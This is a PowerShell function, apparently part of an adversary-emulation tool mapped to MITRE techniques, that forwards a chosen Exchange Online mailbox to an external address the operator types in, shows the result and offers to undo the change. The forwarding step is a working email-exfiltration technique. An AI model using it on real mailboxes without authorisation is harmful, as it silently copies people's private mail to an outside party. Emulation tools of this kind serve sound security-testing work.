function MailForwarding {	
    mitre_details("MailForwarding")

    #Get target mailbox
    EnterMailbox("Enter a mailbox address to setup mail forwarding from")
    $target_mailbox = $global:mailbox_address

    #Enter destination mailbox address
    $ExternalAccount = Read-Host -Prompt "`nEnter a target email to forward the mailbox to"

    #Get-Mailbox -Identity $InternalUserName
    Write-Host "`nDisplaying existing forwarding address of mailbox $target_mailbox , if any ..." -ForegroundColor Gray
    Get-Mailbox -Identity $target_mailbox | Format-Table -Property ForwardingSMTPAddress

    #Setup mailbox forwarding
    try {
        Write-Host "`nSetting up mail forwarding to target email address..." -ForegroundColor Gray
        Set-Mailbox -Identity $target_mailbox -DeliverToMailboxAndForward $true -ForwardingSMTPAddress $ExternalAccount -ErrorAction Stop
        Start-Sleep -s 10
        Get-Mailbox -Identity $target_mailbox | Format-Table -Property ForwardingSMTPAddress
        Write-Host "`n[Success] Deployed mail forwarding on $target_mailbox" -ForegroundColor Yellow
        $allow_undo = $true
    }
    catch {
        Write-Host "`n[Error] Failed to setup mail forwarding on mailbox $target_mailbox" -ForegroundColor Red
    }
    
    #Undo changes
    if ($allow_undo -eq $true) {
        $user_confirm = Read-Host -Prompt "`nWould you like to undo modifications and remove mailbox forwarding (yes/no)"
        if ($user_confirm -notin "No","no","N","n") {
            try {
                Write-Host "`nRemoving mail forwarding from mailbox: $target_mailbox ..." -ForegroundColor Gray
                Set-Mailbox -Identity $target_mailbox -ForwardingSMTPAddress $null
                Write-Host "`n[Undo Success] Removed mail forwarding from mailbox" -ForegroundColor Yellow
            }
            catch {
                Write-Host "`n[Undo Error] Failed to remove mail forwarding from mailbox" -ForegroundColor Red
            }
            
        }
    }
    Pause    
}